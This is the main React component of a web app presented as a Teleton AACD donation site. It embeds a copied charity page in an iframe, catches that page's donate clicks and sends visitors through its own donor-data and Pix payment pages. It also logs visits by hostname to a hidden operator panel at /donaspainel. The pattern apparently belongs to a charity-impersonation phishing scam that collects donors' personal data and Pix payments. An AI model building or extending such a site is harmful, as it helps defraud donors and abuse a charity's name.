import React, { useEffect, useRef, useState } from "react";
import { createPortal } from "react-dom";
import "./App.css";
import { BrowserRouter, Routes, Route, Navigate, useNavigate } from "react-router-dom";
import axios from "axios";
import PixPaymentPage from "./components/PixPaymentPage";
import LoginPage from "./components/LoginPage";
import AdminDashboard from "./components/AdminDashboard";

import DonorDataPage from "./components/DonorDataPage";

const API = '/api';

const HomePage = () => {
  const navigate = useNavigate();
  const iframeRef = useRef(null);
  const [isMobile, setIsMobile] = useState(false);
  const [showModal, setShowModal] = useState(true);

  const handleModalDonate = () => {
    setShowModal(false);
  };

  useEffect(() => {
    const mq = window.matchMedia('(max-width: 1024px)');
    setIsMobile(mq.matches);
    const onChange = (e) => setIsMobile(e.matches);
    mq.addEventListener('change', onChange);

    const handler = (event) => {
      const data = event.data || {};
      if (data.type === 'aacd-donate') {
        const value = parseFloat(data.value) || 55;
        navigate('/doacao/dados', { state: { value } });
      }
      if (data.type === 'teleton-intro-donate') {
        setShowModal(false);
      }
    };
    window.addEventListener('message', handler);
    return () => {
      window.removeEventListener('message', handler);
      mq.removeEventListener('change', onChange);
    };
  }, [navigate]);

  const handleMobileConfirm = () => {
    const win = iframeRef.current && iframeRef.current.contentWindow;
    if (win) win.postMessage({ type: 'aacd-confirm-request' }, '*');
  };

  return (
    <div style={{ position: 'relative', minHeight: '100vh' }}>
      <iframe
        ref={iframeRef}
        title="Teleton AACD"
        src="/aacd.html?v=20260606d"
        data-testid="home-aacd-frame"
        style={{ border: 'none', width: '100%', height: '100vh', display: 'block' }}
      />

      {showModal && createPortal((
        <div
          data-testid="home-donate-modal-overlay"
          style={{
            position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
            width: '100vw', height: '100vh', zIndex: 999999,
            background: '#1a1030',
            overflow: 'hidden',
            fontFamily: 'Montserrat, sans-serif',
            animation: 'aacdFadeIn 0.4s ease',
          }}
        >
          <iframe
            data-testid="home-donate-modal"
            title="Teleton Intro"
            src="/teleton-intro.html"
            style={{ border: 'none', position: 'absolute', inset: 0, width: '100%', height: '100%', display: 'block' }}
          />

          {!isMobile && (
          <button
            data-testid="home-donate-modal-close"
            onClick={() => setShowModal(false)}
            aria-label="Fechar"
            style={{
              position: 'absolute', top: '18px', right: '20px', zIndex: 5,
              width: '42px', height: '42px', borderRadius: '50%', border: 'none',
              background: 'rgba(255,255,255,0.18)', backdropFilter: 'blur(6px)',
              color: '#fff', fontSize: '24px', lineHeight: 1, cursor: 'pointer', padding: 0,
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              transition: 'background 0.2s ease',
            }}
            onMouseEnter={(e) => { e.currentTarget.style.background = 'rgba(255,255,255,0.32)'; }}
            onMouseLeave={(e) => { e.currentTarget.style.background = 'rgba(255,255,255,0.18)'; }}
          >
            ×
          </button>
          )}
        </div>
      ), document.body)}

      {isMobile && (
        <button
          data-testid="mobile-confirm-donation-btn"
          onClick={handleMobileConfirm}
          style={{
            position: 'fixed',
            left: 0,
            right: 0,
            bottom: 0,
            width: '100%',
            zIndex: 999990,
            border: 'none',
            background: '#eb1941',
            color: '#fff',
            fontFamily: 'Montserrat, sans-serif',
            fontWeight: 700,
            fontSize: '16px',
            textTransform: 'uppercase',
            letterSpacing: '0.5px',
            padding: '16px 14px',
            boxShadow: '0 -2px 12px rgba(0,0,0,0.18)',
            cursor: 'pointer',
          }}
        >
          Confirmar Doação
        </button>
      )}
    </div>
  );
};

function App() {
  useEffect(() => {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    axios.post(`${API}/admin/visits/track`, { device: isMobile ? 'Mobile' : 'Desktop', origin: window.location.hostname }).catch(() => {});
  }, []);

  return (
    <div className="App">
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<HomePage />} />
          <Route path="/doacao/dados" element={<DonorDataPage />} />
          <Route path="/doacao/pix" element={<PixPaymentPage />} />
          <Route path="/donaspainel" element={<LoginPage />} />
          <Route path="/donaspainel/dashboard" element={<AdminDashboard />} />
          <Route path="*" element={<Navigate to="/" replace />} />
        </Routes>
      </BrowserRouter>
    </div>
  );
}

export default App;